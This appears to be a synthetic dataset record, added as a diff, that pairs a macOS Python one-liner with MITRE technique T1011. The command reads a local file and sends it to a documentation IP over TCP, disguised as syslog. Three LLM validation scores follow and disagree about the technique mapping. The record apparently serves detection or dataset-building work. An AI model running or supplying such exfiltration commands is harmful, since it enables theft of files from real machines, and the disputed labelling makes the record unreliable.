@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,datetime; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"198.51.100.23\", 49201)); prefix=(\"<34>1 \"+datetime.datetime.utcnow().isoformat()+\"Z macos app - - - \").encode(); s.sendall(prefix+open(\"/Users/Shared/.slog\",\"rb\").read()); s.close()'",
+  "explanation": "Exfiltrates data disguised as syslog-like messages over a non-standard TCP port, using a logging-style medium distinct from a primary C2 path, aligning with T1011.",
+  "rationale_steps": [
+    "Create a TCP socket to an uncommon port (49201) on a documentation IP.",
+    "Prefix content with a syslog-like header to mimic a different network medium.",
+    "Send file bytes as payload over the alternate logging channel.",
+    "No obfuscation employed; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-36b5070d",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket connection, formatting data, and sending file contents.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a non-standard port as claimed, it doesn't align with T1011 (Exfiltration Over Other Network Medium) but rather with T1048 (Exfiltration Over Alternative Protocol) since it's using TCP/IP rather than a distinct network medium, and it doesn't implement data destruction as described in the technique description.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:32:52.208160Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed, uses valid syntax for imports, socket operations, string manipulation, file reading, and network transmission, all enclosed correctly for `python3 -c`.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration by reading a file and sending its contents to a remote server, which is the opposite of data destruction (T1011).",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:32:56.576905Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Python one-liner is well-formed with balanced quotes/parentheses, valid socket usage, and proper byte handling.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates the target file over a TCP connection with a syslog-like prefix as claimed, but it does not perform any data destruction (mismatch with the provided technique description) and uses a documentation IP that may not be reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T02:33:19.493844Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
